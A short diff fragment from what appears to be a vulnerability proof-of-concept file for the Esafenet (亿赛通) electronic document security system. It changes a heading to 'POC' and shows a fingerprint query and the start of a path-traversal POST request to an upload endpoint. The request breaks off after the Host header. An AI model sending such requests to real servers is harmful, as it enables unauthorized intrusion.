@@ -5,7 +5,7 @@
 app="亿赛通-电子文档安全管理系统"
 ```
 
-## poc
+## POC
 ```
 POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
 Host: balalanengliang
